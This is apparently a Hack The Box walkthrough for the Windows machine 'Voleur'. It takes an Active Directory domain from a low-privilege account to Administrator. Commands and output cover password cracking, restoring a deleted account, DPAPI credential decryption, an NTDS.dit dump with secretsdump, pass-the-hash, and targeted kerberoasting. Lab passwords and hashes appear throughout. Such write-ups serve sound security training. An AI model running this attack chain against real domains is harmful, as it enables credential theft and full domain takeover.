<div class="htb-box-info medium">
  <div class="box-header">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9f2d4e31-904e-4756-90fe-3d6872323ca1.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Windows</td></tr>
        <tr><td>Difficulty:</td><td>Medium</td></tr>
        <tr><td>Release:</td><td>5 Jul 2025</td></tr>
      </table>
    </div>
  </div>
</div>

---

> As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt
# Enumeration:
```bash
sudo nmap -p- --open -T4 10.129.232.130
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2222/tcp  open  EtherNetIP-1
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
56192/tcp open  unknown
56193/tcp open  unknown
56195/tcp open  unknown
56221/tcp open  unknown
```


```bash
sudo nmap -v -sV -sC -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389 10.129.232.130
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
| dns-nsid: 
|   NSID: ist10 (6973743130)
|   id.server: ist10
|_  bind.version: Q9-P-2026080500
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-03 20:13:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.99%I=7%D=10/3%Time=6AC0F16D%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x02\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 8h00m01s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-03T20:13:40
|_  start_date: N/A
```

domains: `voleur.htb`, 

something strange is happening here. but i dont know what...
```
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
```

```bash
sudo nmap -sU -p- --min-rate 10000 10.129.232.130
```

```
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap
```

we have creds so let's enum:

#### ssh
![[Pasted image 20261003151759.png]]

#### dns
```bash
dig voleur.htb @10.129.232.130            

; <<>> DiG 9.20.27-2-Debian <<>> voleur.htb @10.129.232.130
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 6496
;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: b588621cec4f5304 (echoed)
;; QUESTION SECTION:
;voleur.htb.                    IN      A

;; ANSWER SECTION:
voleur.htb.             10      IN      A       10.129.232.130

;; Query time: 0 msec
;; SERVER: 10.129.232.130#53(10.129.232.130) (UDP)
;; WHEN: Sat Oct 03 15:19:53 MSK 2026
;; MSG SIZE  rcvd: 67
```

zone transfer failed...
```bash
dig axfr voleur.htb @10.129.232.130

; <<>> DiG 9.20.27-2-Debian <<>> axfr voleur.htb @10.129.232.130
; (1 server found)
;; global options: +cmd
; Transfer failed.
```


#### smb
```bash
netexec smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt'
```
STATUS_NOT_SUPPORTED

```bash
netexec smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
```
KRB_AP_ERR_SKEW

so lets sync our time
```bash
sudo timedatectl set-ntp off
sudo ntpdate 10.129.232.130
```

```bash
netexec smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
```
output:
```
 [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

shares isn't showing
> p.s. the problem was fucked up internet... so i had to use `--smb-timeout 10`...

users:
![[Pasted image 20261003232858.png]]


# Finding svc_ldap creds

there a lot of service accounts...

I will try kerberoasting... but first get ticket
```bash
getTGT.py voleur.htb/ryan.naylor:HollowOct31Nyt
export KRB5CCNAME=ryan.naylor.ccache
```

kerberoasting failed...
```bash
GetUserSPNs.py -k -no-pass -dc-ip 10.129.232.130 -dc-host dc.voleur.htb voleur.htb/ryan.naylor -request
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

lets run bloodhound
```bash
rusthound-ce --domain voleur.htb -f voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -c All
```

I rerun netexec and finaly got my shares...
```bash
netexec smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares --smb-timeout 10
```
I already did it but it didn't give anything... but this time it gave... ok then... 

only this worked for me now:
```bash
netexec smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -M spider_plus -o DOWNLOAD_FLAG=True
```
![[Pasted image 20261004003131.png]]

```bash
file Access_Review.xlsx            
Access_Review.xlsx: CDFV2 Encrypted
```

```bash
office2john Access_Review.xlsx > access.hash
```

```bash
hashcat access.hash --username -m 9600 /usr/share/wordlists/rockyou.txt
```
password -> **football1**

now open this excel document:
![[Pasted image 20261004005329.png]]

so we have found new creds and info from this:
* `svc_ldap:M1XyC9pW7qT5Vn `
* `svc_iis:N5pXyW1VqM7CZ8`
* Todd.Wolfe had password `NightT1meP1dg3on14` and was deleted...
* Jeremy has access to Software folder that could lead to svc_backup account...

lets test those creds:
![[Pasted image 20261004005802.png]]


# Restoring todd.wolfe

lets recall our bloodhound information
![[Pasted image 20261004005906.png]]

so svc_ldap in Restore_user group... mb we can restore todd.wolfe?
> From here I exploited unintended path... In unintended I should first take over svc_winrm service user and move from there... I did it after root flag just to show... 

first check if there is actually deleted account:
```bash
ldapsearch -x -H ldap://10.129.232.130 -D "svc_ldap@voleur.htb" -w 'M1XyC9pW7qT5Vn' -b "DC=voleur,DC=htb" -E '!1.2.840.113556.1.4.417' "(&(objectClass=user)(isDeleted=TRUE))"
```

there is one...
![[Pasted image 20261004010101.png]]

we can restore him using bloodyAD
```bash
bloodyAD --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k set restore todd.wolfe
```

check if he was restored
```bash
netexec smb 10.129.232.130 -u 'todd.wolfe' -p 'NightT1meP1dg3on14' -k

[+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
```


# Decrypting DPAPI creds to access jeremy 

this is almost all default, nothing interesting... but he is in SECOND-LINE TECH...
![[Pasted image 20261004154609.png]]

nothing new here either...
![[Pasted image 20261004155034.png]]
but worth to check IT anyway...

after around 10 mins it's finally donwloaded

there a bunch of files:
powershell history. but noting here...
```
cat AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt

cd appdata
ls
cd local
ls
cd .\Microsoft\
ls
cd .\Credentials\
ls
cd ../../../
cd roaming
ls
cd .\Microsoft\
ls
cd .\Protect\
lw
ls
cd .\S-1-5-21-3927696377-1337352550-2781715495-1110\
ls
ls -h
ipconfig
ls -h

```

but the most valuable file I found is DPAPI creds:

copy all needed files in one dir and run this;
```bash
dpapi.py masterkey -file "08949382-134f-4c63-b93c-ce52efc0aa88" -sid "S-1-5-21-3927696377-1337352550-2781715495-1110" -password "NightT1meP1dg3on14"
```

we got masterkey:
```bash
[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

now decrypt password blob:
```bash
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

and here is our passwd:
```bash
[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

got new creds: `jeremy.combs:qT3V9pLXyN7W4m`

# svc_backup access

This user in THIRD-LINE TECH...

![[Pasted image 20261004170403.png]]

Also this user in remote group. so we can use winrm. but i fucked with evil-winrm connection, the problem was that i needed to create `/etc/krb5.conf`....
```
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

and then:
```bash
evil-winrm -i dc.voleur.htb -u jeremy.combs -r voleur.htb
```

as jeremy I can access Third-Line Support:
![[Pasted image 20261004181428.png]]

in note:
```
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

download id_rsa

for jeremy failed...

but for svc_backup
![[Pasted image 20261004181710.png]]


# Dumping ntds.dit 

we are root on this DC
```
sudo -i
```

we can now access that backup folder:
![[Pasted image 20261004182955.png]]

now i need to download this files. I did it using netcat...

after that we can just crack NTDS.dit
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

and here is our hash:
```
...SNIP...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
...SNIP...
```

Repeat the proccess of getting ticket to auth:
```bash
getTGT.py 'voleur.htb/Administrator' -hashes ":e656e07c56d831611b577b160b259ad2"
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies                            
[*] Saving ticket in Administrator.ccache
```

export in our env:
```
export KRB5CCNAME=Administrator.ccache
```

and now we can winrm in:
```bash
evil-winrm -i dc.voleur.htb -u 'Administrator' -r voleur.htb
```

we got out flag:
![[Pasted image 20261004184030.png]]

also user flag:
![[Pasted image 20261004184057.png]]



# Beyond root
The step that i skipped was targeted kerberoasting on svc_winrm.  I will do it just for sake of practice...

![[Pasted image 20261004185148.png]]

write some fake SPN
```bash
bloodyAD -k -d voleur.htb --host dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set object svc_winrm servicePrincipalName -v 'http/test' 
[+] svc_winrm's servicePrincipalName has been updated
```

now request
```bash
GetUserSPNs.py -k -dc-ip 10.129.232.130 -dc-host dc.voleur.htb voleur.htb/svc_ldap -request-user svc_winrm
```

```
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$a873ad5dd95d9685d03fc3f9fd45e2c8$33568876823047cdd4f8bba2929c335e3a307393ec4e25fce35571f4c0987e047cfe666443ea93678daaf991a02e5981d0c341f6cac0f5c831cd580b7365e16e1c05c4c386d297dd4195b61b34a0b77c47cbb5eea7ada7c08ae6a535a90f745d572624e222e3b14714dfcad67602e554f3eb70f7733b17e32feaf0ed0a586f3162e834623881c1f1c18a39d9d61cbe047716e8ffc3baf10f591e109550ce078c4e8197de63a92ac2e721df566c561958d6b40362da3f4600fec15e6a3bb03e6b6cefe79848b8372861fee99f1bcb18d1f71ab875e9ea9e57d2c2b282352cb55ab7beb4d10a3e4bfe186aad9ffa6af02f0222357dac913d45b3fe3e91801ce5f5bb2ea3cfc3820abd46a46da04d06749156bbd0324f2ad45276d65675be5904e4d9eacb256a3f10b6c20d7c1d746e30d0f0af31ee5ddbbb4b15328979e618011ae3badfb41a7ffbd13173946b7454b0ba78eebe3506c7189eb1c6b175e1c583805914698c90e67fc4993d83ff69d924b4eee78be48ac681e3f20b46e40dbda45742cde9bc698539b1659903f14d7a387d12ac15e4d2a08515744d2c99a56d8805e8baff714aaee74bf3bd330f5556ed10d8367e821b4f0b3b39049b8e92a682afd025df957e848f11b4975006d974ef4b693ae8df72a007c632950f6d566ae54e73bb3cd7aac9335a51eeb967d3e50dc2b07bfc8d89e2045623ce4ad9439bef3ded4ba234627fc07ed8c382e5b404ccd6e5e7caa2363a6df55a3210164abf4fa1ce35bd3df3a4d59e2a666023ffe25d561cbc0f0b61026d36cce6d1a93bd4efe1388af299a3c74e5a5232548caf18dd11c89ef0e7fa6d08873e84aa65fcb7adf894b47d6a3bed6970806b869c5fe2245a9ddb519bc36c126388db7e205741faecc6a4009bf1c332d080cb7e38f8559fe2dc21cdb49291c9e3303b2545de96908963c68b39a00d30626b4fe390723f21bb95c8b53030a7aeab2a071f79af8eeb255a4404b33ea19b35bc489ad08ac8b6cd1ae26113b3a6223508c169854d74fc91c66d5df84df7b0fb0b4b6e2a7e0e3bee97114ca613d98af6c89a6a7b0f8458ae1a274674cd9e1d666a1c7d916f7a47c45407f0af97627b0c88e4c12a3a106006e1238202d196cc1b844d8069960e2de708292c66037f85f37ff6ece32cfa51a20508d2d2bb207539f5406a4c6f9c0c6f7667e5726ed72112b3eec2098638cd91226bf10a3351e64a25aa4cad562b776b12db9c428d9352515010938478141c0ad3c6fda4c065db36aeb50dc2762de58ce3c5c40c992b2a20c149894d6cb03a45f3595c4f39939ebf1de12ad6bb4479519621b5c3d9b7b27ed687deaae010ea33ab1a9ec56c40f03a1ae4175fb0e70d3643234f824ad4ba1b1d4afadeda7e97bc379c9ecd331d62a277c42c358e0c14f308007224346cc09e5f0024628a861645ffb5373ea4e997a36c478fe8cf31f45144aa5a
```

now we need to crack it

```bash
hashcat hash -m 13100 /usr/share/wordlists/rockyou.txt
```

and we got password: **AFireInsidedeOzarctica980219afi**

![[Pasted image 20261004185958.png]]

